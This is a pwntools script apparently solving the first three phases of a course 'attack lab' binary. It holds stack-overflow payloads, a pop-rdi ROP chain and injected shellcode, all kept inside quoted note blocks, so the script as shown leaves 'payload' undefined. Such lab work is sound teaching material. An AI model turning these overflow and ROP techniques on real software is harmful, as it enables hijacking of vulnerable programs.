from pwn import *
import re

context(log_level = "debug", os = "linux", arch = "amd64")

sh = process(argv = ["/home/xlj/Desktop/ctarget", "-q"])

line = sh.recvline()
Cookie = re.findall(": (.+?)\n", line)[0]
Cookie = int(Cookie, 16)

stack_begin = 0x5561dc78
stack_end = 0x5561dca0
'''
touch 1 answer

Ad_touch1 = 0x4017C0
payload = '1' * (stack_end - stack_begin)
payload += p64(Ad_touch1)
'''

'''
touch 2 answer:
ROPgadget --binary ./ctarget | grep "rdi": find pop rdi, ret
if cannot use ROPgadget, "pop rdi; ret;" == "5f c3"; try 'objdump -d ctarget | grep "5f c3"' to find gadget'
if opcode doesn't in one_line? Try to use hex editor to find opcode[Code Section]
target: change rdi as Cookie

ROP:
Ad_touch2 = 0x4017EC
Ad_PopRdi_ret = 0x40141b
payload = '1' * (stack_end - stack_begin) + p64(Ad_PopRdi_ret) + p64(Cookie) + p64(Ad_touch2)

Code injecttion:
Ad_touch2 = 0x4017EC
shellcode = '''
#mov rdi, %d
#ret
''' %Cookie
shellcode = asm(shellcode)
payload = shellcode + '\x00' * (stack_end - stack_begin - len(shellcode)) + p64(stack_begin)+ p64(Ad_touch2)
'''

'''
touch 3 answer: 
use touch 2 gadget
target: change rdi as Ad_Cookie
move Cookie to stack and change rdi stack

ROP:
Ad_touch3 = 0x4018FA
Ad_PopRdi_ret = 0x40141b
payload = hex(Cookie)[2:] + '\x00' * (stack_end - stack_begin - len(hex(Cookie)[2:])) + p64(Ad_PopRdi_ret) + p64(stack_begin) + p64(Ad_touch3)

Code injection:
Ad_touch3 = 0x4018FA
Ad_PopRdi_ret = 0x40141b

shellcode = '''
#mov rdi, 0x5561dc78
#ret
'''
shellcode = asm(shellcode)
payload = hex(Cookie)[2:] + '\x00' * (stack_end - stack_begin - len(hex(Cookie)[2:]) - len(shellcode)) + shellcode + p64(stack_end - len(shellcode)) + p64(Ad_touch3)
'''

sh.sendline(payload)
print(sh.recvall())